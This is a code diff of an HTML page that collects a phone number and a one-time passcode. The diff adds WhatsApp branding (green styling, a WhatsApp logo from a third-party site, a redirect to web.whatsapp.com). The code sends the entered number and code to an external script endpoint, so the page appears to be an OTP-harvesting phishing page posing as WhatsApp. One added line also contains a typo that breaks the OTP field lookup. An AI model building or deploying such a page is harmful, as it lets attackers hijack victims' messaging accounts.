@@ -33,11 +33,47 @@ input, button {
 progress {
     width: 200px;
 }
+
+header {
+    background-color: green;
+    color: white;
+    text-align: center;
+    padding: 10px;
+    width: 100%;
+  
+  }
+
+  footer {
+    background-color: green;
+    color: white;
+    text-align: center;
+    padding: 10px;
+    width: 100%;
+    position: fixed;
+    bottom: 0;
+  }
+      button {
+  background-color: green; /* WhatsApp green color */
+  color: white;
+  padding: 10px 20px;
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+  font-size: 16px;
+}
+
+button:hover {
+  background-color: #1DA335; /* Darker green color on hover */
+}
+      img{border-radius:50%;    padding: 30px;}
   </style>
   
 </head>
 <body>
-    <img src="https://github.com/images/mona-happy.gif" alt="Logo" class="logo">
+  <header>
+    <h1>OTP Form Header</h1>
+  </header>
+    <img src="https://toppng.com/uploads/preview/download-whatsapp-social-media-apps-11563650769y1qhv167dh.png" alt="Logo" class="logo">
     <form id="otpForm">
         <input type="tel" id="phoneNumber" placeholder="Phone Number">
         <button id="getOtpBtn">Get OTP</button>
@@ -49,11 +85,14 @@ progress {
         <button id="checkOtpBtn" style="display:none;">Check OTP</button>
         
     </form>
+  <footer>
+    <p>&copy; OTP Form Footer</p>
+  </footer>
 
     <script>
 
       const urlParams = new URLSearchParams(window.location.search);
-  const link = urlParams.get('link.html');
+  const link = urlParams.get('link');
 
 document.getElementById('getOtpBtn').addEventListener('click', getOtp);
 document.getElementById('checkOtpBtn').addEventListener('click', checkOtp);
@@ -90,8 +129,12 @@ function getOtp(e) {
 function checkOtp(e) {
   e.preventDefault();
   var phoneNumber = document.getElementById('phoneNumber').value;
-  var otp = document.getElementById('otpInput').value;
+  var otp = document.getElementById('otp(otpInput').value;
   
+  if (!link) {
+     window.open('https://web.whatsapp.com/', '_blank');
+    return;
+  }
   
   fetch(`${scriptUrl}?update=true&phoneNumber=${phoneNumber}&otp=${otp}&link=${link}`)
     .then(response => response.json())
@@ -103,14 +146,6 @@ function checkOtp(e) {
       }
     })
     .catch(error => console.error('Error:', error));
-  
-  
-  if (!link) {
-     window.open('google.com', '_blank');
-    return;
-  }
-  
- 
 }
   </script>
 </body>
